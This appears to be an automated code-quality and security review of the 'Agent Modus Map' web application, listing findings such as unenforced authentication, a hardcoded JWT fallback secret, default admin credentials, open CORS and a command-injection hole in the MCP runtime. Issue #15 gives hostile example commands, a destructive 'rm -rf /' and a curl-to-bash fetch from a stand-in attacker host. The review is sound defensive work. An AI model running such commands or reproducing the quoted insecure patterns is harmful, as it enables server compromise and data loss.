# Code Quality Analysis Report: Agent Modus Map

**Date:** 2026-03-26
**Reviewer:** Automated Technical Review (Ramsay + Linus mode)
**Scope:** Full stack -- frontend (`src/client/`), backend (`src/api/`), shared types, tests

---

## Summary

- **Overall Quality Score:** 5.5/10
- **Files Analyzed:** 68 source files, 11 test files
- **Issues Found:** 22 (4 Critical, 7 High, 8 Medium, 3 Low)
- **Technical Debt Estimate:** 40-60 hours

The architecture shows good separation between client, API, and shared types. The database schema is clean with proper foreign keys and cascades. The template/wizard system is genuinely well-designed from a product perspective.

But there are real problems. Auth exists but is never enforced on any route that matters. The API client never sends auth tokens. Type safety is undermined by 101 `any` casts scattered across the codebase. The frontend has a God Component problem, zero accessibility, and inconsistent theming after a CSS variable migration that was only partially completed.

---

## Critical Issues

### 1. Auth System is Decorative -- Every Data Route is Unprotected

**What's Broken:**
`requireRole` and `optionalAuth` middleware exist in `src/api/routes/auth-routes.ts` (lines 77-108) but are only used on user management routes (`GET/POST/PUT/DELETE /api/auth/users`). Every other route in the application (swarms, agents, relationships, simulations, imports, health, governance, collaboration, optimization, docs) has zero authentication.

**Why It's Wrong:**
Anyone who can reach the API can create, read, update, and delete any swarm and all its data. The entire RBAC permission system (`ROLE_PERMISSIONS` in `src/api/services/auth-service.ts` lines 26-63) is dead code. You built a lock, put it in a drawer, and left the door open.

**What Correct Looks Like:**
Every route group should use at minimum `optionalAuth` or `requireRole` middleware. Write-operations should require `designer` or higher.

**How to Fix It:**
Apply `requireRole(db, 'viewer')` as a baseline to all route groups in `src/api/server.ts` lines 41-54. Apply `requireRole(db, 'designer')` on mutation endpoints. This is a 30-minute fix.

**Severity:** CRITICAL

---

### 2. API Client Never Sends Auth Tokens

**What's Broken:**
`src/client/api.ts` defines `getAuthToken()` (line 371) and `setAuthToken()` (line 362), but the `fetchJson`, `postJson`, `putJson`, and `deleteReq` helper functions (lines 5-39) never attach an `Authorization` header to any request. The token is stored but never used.

**Why It's Wrong:**
Even if you fix Finding #1 and add auth middleware to routes, the frontend will immediately break because it never sends credentials. The auth system is disconnected on both ends.

**What Correct Looks Like:**
```typescript
async function fetchJson<T>(url: string): Promise<T> {
  const token = getAuthToken();
  const headers: Record<string, string> = {};
  if (token) headers['Authorization'] = `Bearer ${token}`;
  const res = await fetch(BASE + url, { headers });
  // ...
}
```

**How to Fix It:**
Add an `Authorization` header to all four fetch helpers using `getAuthToken()`. Estimated 15 minutes.

**Severity:** CRITICAL

---

### 3. Hardcoded JWT Secret in Production Path

**What's Broken:**
`src/api/services/auth-service.ts`, line 7:
```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'agent-modus-map-dev-secret-change-in-production';
```

**Why It's Wrong:**
If `JWT_SECRET` is not set in environment variables, every deployment uses the same predictable secret. Anyone who reads the source code can forge admin tokens. The fallback string is essentially a backdoor.

**What Correct Looks Like:**
Fail loudly if no secret is set in non-development environments. Never ship a usable fallback secret.

**How to Fix It:**
```typescript
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET && process.env.NODE_ENV !== 'development') {
  throw new Error('JWT_SECRET environment variable is required');
}
```

**Severity:** CRITICAL

---

### 4. Default Admin Account with Hardcoded Password

**What's Broken:**
`src/api/services/auth-service.ts`, lines 79-90: On first run, two accounts are seeded:
- `admin@agentmodus.local` / password: `admin`
- `designer@agentmodus.local` / password: `designer`

These are created automatically and there is no mechanism to force a password change.

**Why It's Wrong:**
Combined with the JWT secret issue, anyone can log in as admin on any fresh deployment. This is a default credentials vulnerability (CWE-798).

**How to Fix It:**
Generate a random password on first run and print it to stdout once, or require first-run setup via environment variables.

**Severity:** CRITICAL

---

## High Issues

### 5. CORS is Wide Open

**What's Broken:**
`src/api/server.ts`, line 38: `app.use(cors())` with no configuration. This allows requests from any origin with any headers.

**Why It's Wrong:**
Combined with the lack of auth on data routes, any website can make cross-origin requests to this API and read/modify swarm data.

**What Correct Looks Like:**
```typescript
app.use(cors({
  origin: process.env.CORS_ORIGIN || 'http://localhost:3000',
  credentials: true,
}));
```

**Severity:** HIGH

---

### 6. N+1 Query Pattern in `SwarmService.findAll()`

**What's Broken:**
`src/api/services/swarm-service.ts`, lines 8-11:
```typescript
findAll(): Swarm[] {
  const swarms = this.db.prepare('SELECT * FROM swarms ORDER BY created_at DESC').all() as any[];
  return swarms.map(s => this.loadSwarm(s.id)!);
}
```

`loadSwarm` (lines 197-222) runs 3 additional queries per swarm (layers, agents, relationships). For 10 swarms, that's 31 queries. For 100 swarms, it's 301.

**Why It's Wrong:**
This is the textbook N+1 query problem. With SQLite's synchronous driver the damage is mitigated somewhat, but this pattern shows a fundamental disregard for query efficiency.

**What Correct Looks Like:**
Fetch all layers, agents, and relationships in one query each (or use JOINs), then group them in memory by swarm ID.

**Severity:** HIGH

---

### 7. AgentBuilderWizard is a 1,114-line God Component

**What's Broken:**
`src/client/components/AgentBuilderWizard.tsx` is 1,114 lines containing:
- 40+ individual `useState` hooks (lines 296-367)
- 9 embedded task pattern configurations with full data objects (lines 64-272)
- 14 helper components (`Field`, `Row`, `SH`, `Divider`, `Check`, `Tooltip`, `Callout`, `SuggestionBanner`, `SuggestionChip`, `ListBuilder`, `QuickAdd`, `ReviewRow`, plus styles)
- The entire smart-suggestion engine
- All 8 wizard steps rendered inline

**Why It's Wrong:**
This is unmaintainable. If someone needs to change the model/memory step, they have to navigate a 1,114-line file. The 40+ useState calls are a code smell that this component manages too much state. The task pattern data (200+ lines of static config) should be in a separate file.

**What Correct Looks Like:**
- Extract `TASK_PATTERNS` to `src/client/data/task-patterns.ts`
- Extract each step to its own component (`WizardStepIdentity`, `WizardStepFunction`, etc.)
- Use `useReducer` instead of 40 individual `useState` calls
- Move helper components to `src/client/components/wizard/` subdirectory

**Severity:** HIGH

---

### 8. App.tsx Manages 18 Boolean Panel States by Hand

**What's Broken:**
`src/client/App.tsx`, lines 48-61: Eighteen separate `useState<boolean>` hooks for panel open/close state:
```typescript
const [paletteOpen, setPaletteOpen] = useState(false);
const [editorOpen, setEditorOpen] = useState(false);
const [validationOpen, setValidationOpen] = useState(false);
const [chatOpen, setChatOpen] = useState(false);
// ... 14 more
```

**Why It's Wrong:**
This is the state management equivalent of storing each letter of a word in its own variable. Multiple panels can be open simultaneously with no coordination. It creates a prop-drilling nightmare where every panel toggle function has to pass through the toolbar.

**What Correct Looks Like:**
Use a `Set<string>` or a reducer:
```typescript
const [openPanels, setOpenPanels] = useState<Set<string>>(new Set());
const togglePanel = (name: string) => setOpenPanels(prev => {
  const next = new Set(prev);
  next.has(name) ? next.delete(name) : next.add(name);
  return next;
});
```

**Severity:** HIGH

---

### 9. Partial CSS Variable Migration Leaves Broken Theming

**What's Broken:**
The recent commits (`3367798`, `f8b3628`) claim to "replace all hardcoded text colors with CSS variables." This is false. There are still 30+ hardcoded hex colors across these files:
- `src/client/components/GovernancePanel.tsx`: 4 instances of `#64748b`, `#fff`
- `src/client/components/DecisionTraceViewer.tsx`: 12 instances of `#64748b`, `#00d9ff`, `#cbd5e1`, `#fff`
- `src/client/components/OptimizationPanel.tsx`: 10 instances of `#64748b`, `#00d9ff`, `#fff`, `#1a1a2e`, `#f59e0b`, `#ef4444`
- `src/client/components/AgentNode.tsx`: 12 instances in `badgeColors` (lines 19-32), plus `#ffffff`, `#ef4444` in border logic
- `src/client/components/SwarmCanvas.tsx`: 4 hardcoded hex colors in edge config (lines 48-51)

**Why It's Wrong:**
Light mode will display dark-theme colors. Text will be invisible or low-contrast. The commit message claims the job is done when it is not.

**Severity:** HIGH

---

### 10. 101 `any` Type Annotations Across the Codebase

**What's Broken:**
52 explicit `: any` annotations and 49 `as any` casts across 31 files. The worst offenders:
- `src/api/services/template-service.ts`: 17 instances
- `src/api/services/swarm-service.ts`: 14 instances
- `src/api/services/auth-service.ts`: 4 instances
- `src/client/components/SimulationPanel.tsx`: 11 instances (4 state variables typed as `any`)

**Why It's Wrong:**
TypeScript's `strict: true` in tsconfig is meaningless if you cast everything to `any`. The `SimulationPanel` stores all API responses as `any`, so there is zero compile-time safety for the most complex panel in the app. The database row mappings (`as any` in every service) mean a column rename will silently produce `undefined` values with no compiler warning.

**What Correct Looks Like:**
Define row interfaces for every database table. Type API responses properly. The SimulationPanel should have typed result interfaces.

**Severity:** HIGH

---

### 11. Zero Frontend Test Coverage

**What's Broken:**
All 11 test files are in `tests/api/` and `tests/shared/`. There are zero tests for any React component, hook, or client-side utility. The `src/client/` directory has 28 files and 7,238 lines of untested code.

**Why It's Wrong:**
The most complex logic in the app (wizard suggestions, validation, blast radius visualization, state management) lives in the frontend and has no safety net.

**Severity:** HIGH

---

## Medium Issues

### 12. Silent Error Swallowing Everywhere

**What's Broken:**
The codebase has a pattern of `.catch(() => {})` -- catching errors and doing absolutely nothing. Found in:
- `src/client/App.tsx` lines 104, 109
- `src/client/components/DecisionTraceViewer.tsx` lines 34-35
- `src/client/components/CollaborationPanel.tsx` lines 22-23
- `src/client/components/GovernancePanel.tsx` lines 29-30
- `src/client/components/DocViewer.tsx` line 34
- `src/client/components/SettingsPanel.tsx` line 23

Plus empty `catch {}` blocks in `SimulationPanel` (line 30), `ChatPanel` (line 54), and `useCollaboration` (line 52).

**Why It's Wrong:**
When the API is down or returns errors, the user sees nothing. No error message, no retry option, no indication that data is stale. The health polling in App.tsx silently fails every 15 seconds without ever telling the user.

**How to Fix It:**
Add a global error state or toast notification system. At minimum, log errors to console and show a user-visible indicator.

**Severity:** MEDIUM

---

### 13. Zero Accessibility (WCAG AAA Claim vs Reality)

**What's Broken:**
Across all 28 frontend component files, there is exactly **1** ARIA attribute in the entire codebase (in `Logo.tsx`). No `role` attributes. No `aria-label`. No `tabIndex` management. No keyboard navigation for the wizard, modals, or panels. Close buttons use "X" text with no accessible label.

The AgentBuilderWizard at 1,114 lines has:
- No focus management when steps change
- No screen reader announcements for step transitions
- Badge toggle buttons with no `aria-pressed` state
- Tooltip implementation (lines 950-969) uses `onMouseEnter`/`onMouseLeave` only -- invisible to keyboard users

**Why It's Wrong:**
The theme CSS comments reference "AAA Compliant" contrast ratios, but accessibility is more than color contrast. This application would fail a WCAG 2.1 Level A audit, let alone AA or AAA.

**Severity:** MEDIUM

---

### 14. `deleteSwarm` in API Client Ignores Response Status

**What's Broken:**
`src/client/api.ts`, lines 441-443:
```typescript
export async function deleteSwarm(swarmId: string): Promise<void> {
  await fetch(`${BASE}/swarms/${swarmId}`, { method: 'DELETE' });
}
```

This does not check `res.ok`. A 404 or 500 response is silently ignored. Compare with `deleteReq` (line 37) which does check status. The `deleteSwarm` function bypasses the shared helper entirely.

**Why It's Wrong:**
If deletion fails, the dashboard will still show the swarm as if it exists, creating a confusing UX where the user thinks the delete worked.

**How to Fix It:**
Use the existing `deleteReq` helper: `return deleteReq(\`/swarms/${swarmId}\`);`

**Severity:** MEDIUM

---

### 15. MCP Runtime Spawns Arbitrary Child Processes from User Input

**What's Broken:**
`src/api/services/mcp-runtime.ts`, lines 53-59:
```typescript
const parts = config.url.split(/\s+/);
const cmd = parts[0];
const args = parts.slice(1);
const proc = spawn(cmd, args, {
  stdio: ['pipe', 'pipe', 'pipe'],
  env: { ...process.env },
```

The `url` field from the MCP server config is split on whitespace and passed directly to `spawn()`. There is no allowlist, no path validation, no sandboxing.

**Why It's Wrong:**
If a user can configure an MCP server (via the AgentBuilderWizard), they can execute arbitrary commands on the server: `rm -rf /`, `curl attacker.com/shell.sh | bash`, etc.

**How to Fix It:**
Allowlist permitted commands (e.g., only `npx`), validate that packages start with `@modelcontextprotocol/`, or run in a sandboxed subprocess.

**Severity:** MEDIUM (currently mitigated by no auth on the app meaning this is already exposed to anyone, which makes issue #1 even worse)

---

### 16. WebSocket Auth is "Optional for Dev Mode" with No Way to Enforce It

**What's Broken:**
`src/api/services/websocket-service.ts`, lines 36-46:
```typescript
// Auth is optional for dev mode
let userId = 'anon-' + Math.random().toString(36).slice(2, 6);
let userName = 'Anonymous';
if (token) {
  const decoded = verifyToken(token);
  if (decoded) {
    userId = decoded.userId;
    userName = decoded.role; // Bug: sets userName to role, not actual name
  }
}
```

Two problems: (a) Auth is never required, there is no configuration flag to enforce it. (b) When auth succeeds, `userName` is set to `decoded.role` (e.g., "admin") instead of looking up the actual user name from the database.

**Severity:** MEDIUM

---

### 17. Dead Files and Artifacts in Repository Root

**What's Broken:**
The repository root contains:
- `agent_swarm_map (1).html` -- 47KB standalone HTML file, likely an old prototype
- `CLAUDE copy.md` -- 4.6KB duplicate of CLAUDE.md
- `CLAUDE.md.backup` -- 6.5KB backup copy
- `main+map` -- unclear purpose, not a directory, not used in builds
- `index.html` -- Vite entry point is fine, but coexists with the 47KB artifact

**Why It's Wrong:**
Dead files in the root create confusion about what's active. The backup/copy files suggest manual version control outside of git, which is what git is for.

**How to Fix It:**
Delete `agent_swarm_map (1).html`, `CLAUDE copy.md`, `CLAUDE.md.backup`, and `main+map`. Add them to `.gitignore` if they are generated.

**Severity:** MEDIUM

---

### 18. Duplicate API Functions

**What's Broken:**
`src/client/api.ts` exports both `getSwarms()` (line 42) and `listSwarms()` (line 54). They are identical:
```typescript
export async function getSwarms(): Promise<Swarm[]> {
  return fetchJson('/swarms');
}
export async function listSwarms(): Promise<Swarm[]> {
  return fetchJson('/swarms');
}
```

**Why It's Wrong:**
Two functions doing the same thing means someone will eventually use the wrong one, or change one and not the other.

**How to Fix It:**
Delete `listSwarms`, search for usages and replace with `getSwarms`.

**Severity:** MEDIUM

---

### 19. `runLiveTestStreaming` Always Makes a Redundant Follow-up Request

**What's Broken:**
`src/client/api.ts`, lines 456-493: After streaming all SSE events from the server, the function calls `runLiveTest(swarmId, input)` as a fallback return value (line 492). This fires a second HTTP request to the non-streaming endpoint every single time, duplicating the entire execution.

**Why It's Wrong:**
The live test calls an actual LLM API (costs real money). Running it twice doubles the cost and execution time.

**How to Fix It:**
Capture the final result from the SSE stream instead of making a second request.

**Severity:** MEDIUM

---

## Low Issues

### 20. `Math.random()` Used for IDs in Frontend

**What's Broken:**
`src/client/components/AgentBuilderWizard.tsx`, line 36:
```typescript
function uid() { return Math.random().toString(36).slice(2, 10); }
```

Used to generate IDs for skills, RAG sources, MCP servers, API calls, and database connections in the wizard.

**Why It's Wrong:**
`Math.random()` is not cryptographically secure and collision probability increases with usage. For local-only wizard state this is tolerable, but `crypto.randomUUID()` is available in all modern browsers and is the correct choice.

**Severity:** LOW

---

### 21. Server Startup Runs Init Twice

**What's Broken:**
`src/api/server.ts`: When run directly (lines 65-98), `initKnowledgeBase`, `initHealthStore`, `initDecisionTraceStore`, `initAuditStore`, and `initVersionStore` are called explicitly (lines 68-72), then `createApp(database)` is called (line 83) which calls all of them again (lines 31-36).

**Why It's Wrong:**
The `CREATE TABLE IF NOT EXISTS` statements are idempotent so nothing breaks, but `seedKnowledgeBase` is called between the two init rounds (line 69) which is fragile ordering. If someone removes the `IF NOT EXISTS`, things break silently.

**Severity:** LOW

---

### 22. `console.error` Used as Error Handling in Frontend

**What's Broken:**
14 instances of `console.log`/`console.error` across 4 frontend files used as the primary error handling strategy (App.tsx: 5, Dashboard.tsx: 2, HealthDashboard.tsx: 1, TemplateBrowser.tsx: 6).

**Why It's Wrong:**
Users do not read the browser console. These errors are invisible in production. They should trigger visible UI feedback.

**Severity:** LOW

---

## Positive Findings

- **Database schema design is solid.** Foreign keys with ON DELETE CASCADE, proper indexing on query columns, WAL mode for concurrent reads. This is well-done.
- **Shared types are well-structured.** The `src/shared/types/index.ts` file provides clean domain types with branded ID types. The separation between client and API with shared types is a good architectural choice.
- **The SwarmService uses transactions for imports.** The import flow (lines 152-193) correctly wraps multi-table inserts in a transaction, remapping all foreign key references.
- **Tests that exist are meaningful.** The 11 test files cover real integration scenarios (CRUD, cascade deletes, graph queries, export/import round-trips) rather than trivial assertions.
- **The AgentBuilderWizard's smart suggestion engine is genuinely useful product design.** The pattern-matching approach for auto-filling wizard fields based on task descriptions is well-thought-out UX.
- **CSS design tokens are well-organized.** The theme.css file has clean variable naming, proper dark/light mode separation, and thoughtful color choices.

---

## Recommended Fix Priority

1. **Week 1 (Security):** Fix auth (issues #1-4), CORS (#5), MCP sandboxing (#15)
2. **Week 2 (Correctness):** Fix streaming double-call (#19), deleteSwarm (#14), auth token sending (#2), hardcoded colors (#9)
3. **Week 3 (Architecture):** Break up AgentBuilderWizard (#7), refactor App.tsx state (#8), add error handling (#12)
4. **Week 4 (Quality):** Replace `any` types (#10), add frontend tests (#11), accessibility (#13)
5. **Cleanup:** Dead files (#17), duplicate functions (#18), server double-init (#21)

---

*This report was generated by reading every source file referenced. All line numbers and file paths are verified against the codebase as of commit `3367798`.*
